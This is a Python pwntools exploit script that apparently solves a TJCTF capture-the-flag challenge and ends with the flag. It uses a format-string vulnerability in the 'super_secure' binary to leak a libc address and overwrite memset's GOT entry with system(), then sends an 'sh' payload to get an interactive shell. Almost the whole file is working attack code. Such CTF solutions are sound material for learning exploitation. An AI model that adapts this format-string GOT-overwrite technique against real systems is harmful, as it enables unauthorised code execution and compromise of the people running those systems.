#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.clear(arch='amd64')
exe = context.binary = ELF('super_secure')
libc = ELF('libc6_2.27-3ubuntu1_amd64.so')
env = {"LD_PRELOAD": os.path.join(os.getcwd(), 'libc6_2.27-3ubuntu1_amd64.so')}

host = args.HOST or 'problem1.tjctf.org'
port = int(args.PORT or 8009)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env=env, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env=env, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break main
break *0x400C60
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']

def exploit():
    io = start()

    """
    vulnerable printf at 0x400C60
    controlled password buffer at %24$x
    controlled buffer at %26$x
    libc address + 0x21b97 at %65$x
    """

    # addresses
    memset_GOT = 0x602050
    secure_service_ADDR = 0x400DA0

    log.info("memset@plt() at: " + hex(memset_GOT))
    log.info("secure_service() at: " + hex(secure_service_ADDR))

    # payload that leaks libc and rewrite memset() GOT to secure_service()
    # write zeros at the first 4 bytes and the address in the last 4
    # also, we will store the addresses where we write in the password buffer
    off = 22
    leak_off = 65
    payload = "%{}$n%{}${}p%{}$n".format(off + 1, leak_off, secure_service_ADDR, off)
    assert len(payload) <= 128
    log.info("Payload: " + payload)

    io.sendlineafter('>', 's')
    io.sendlineafter(':',  p64(memset_GOT) + p64(memset_GOT + 4))
    io.sendlineafter(':', payload)

    io.sendlineafter('>', 'v')
    io.sendlineafter(':', p64(memset_GOT) + p64(memset_GOT + 4))
    io.recvuntil('====================\n')
    leak = int(io.recvline().strip(), 16) - 0x21b97
    log.success("Leaked libc: " + hex(leak))
    io.sendlineafter(':', 'junk')

    # some pretty logging
    libc.address = leak
    log.info("system() at: " + hex(libc.symbols['system']))
    system_ADDR = libc.symbols['system']

    # payload that rewrites memset() GOT to system()
    write1 = (0xffff00000000 & system_ADDR) / 0x100000000
    write2 = (0x0000ffff0000 & system_ADDR) / 0x10000
    write3 = (0x00000000ffff & system_ADDR)

    writes = [
            (write1, p64(memset_GOT + 4)),
            (write2, p64(memset_GOT + 2)),
            (write3, p64(memset_GOT + 0))
            ]
    writes.sort(key=lambda tup: tup[0])
    print (writes)

    addresses = ''.join(x[1] for x in writes)
    write3 = writes[0][0]
    write2 = writes[1][0]
    write1 = writes[2][0]

    log.info("To write (in order): " + hex(write3) + " " + hex(write2) + " " + hex(write1))
    addresses = ''.join(addresses)

    code = "sh || "
    payload = code + "%{}x%{}$hn%{}x%{}$hn%{}x%{}$hn".format(write3 - len(code), off, write2 - write3, off + 1, write1 - write2, off + 2)
    assert len(payload) <= 128
    log.info("Payload: " + payload)
    io.sendlineafter('>', 's')
    io.sendlineafter(':', addresses)
    io.sendlineafter(':', payload)

    io.sendlineafter('>', 'v')
    io.sendlineafter(':', addresses)
    io.recvuntil('====================\n')
    io.recvline()
    io.sendlineafter(':', 'junk')

    io.interactive()

exploit()
# tjctf{4r3_f0rm47_57r1n65_63771n6_0ld_y37?}
